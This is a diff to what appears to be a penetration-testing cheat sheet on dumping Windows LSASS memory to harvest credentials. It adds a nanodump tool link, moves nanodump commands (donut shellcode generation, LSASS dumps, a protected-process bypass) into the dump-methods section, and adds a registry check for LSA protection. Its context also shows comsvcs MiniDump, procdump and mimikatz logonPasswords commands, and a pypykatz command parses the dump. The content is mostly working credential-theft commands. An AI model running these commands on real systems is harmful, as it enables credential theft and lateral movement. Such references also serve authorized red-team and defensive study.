@@ -5,9 +5,10 @@
 - Enforce security policies
 - Write to Windows' security log
 
-## mimikatz
+## Tools
 
 - [mimikatz (release)](https://github.com/gentilkiwi/mimikatz/releases)
+- [nanodump.x64.exe](https://github.com/fortra/nanodump/blob/main/dist/nanodump.x64.exe)
 
 ### Dump methods
 
@@ -25,8 +26,19 @@ Get-Process lsass # get PID
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\lsass.dmp full
 ```
 
-```cmd [Alternative (procdump)]
+```cmd [procdump]
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+```bash [nanodump]
+# Generate shellcode
+donut -f nanodump.x64.exe -o payload.bin -a 2
+
+# Basic dump
+nanodump.x64.exe --write C:\temp\lsass.dmp
+
+# PPL bypass (requires signed driver)
+nanodump.x64.exe --ppl --write lsass.dmp
 ```
 
 :::
@@ -47,22 +59,14 @@ mimikatz # sekurlsa::logonPasswords
 
 ```powershell
 Get-Process lsass | Select-Object ProcessName, @{Name='Protected';Expression={$_.ProtectedProcess}}
+
+# via reg
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
 ```
 
 ### Extract credentials from dump
 
 ::: code-group
-
-```bash [nanodump]
-# Generate shellcode
-donut -f nanodump.x64.exe -o payload.bin -a 2
-
-# Basic dump
-nanodump.x64.exe --write C:\temp\lsass.dmp
-
-# PPL bypass (requires signed driver)
-nanodump.x64.exe --ppl --write lsass.dmp
-```
 
 ```bash [pypykatz]
 pypykatz lsa minidump lsass.dmp --quiet
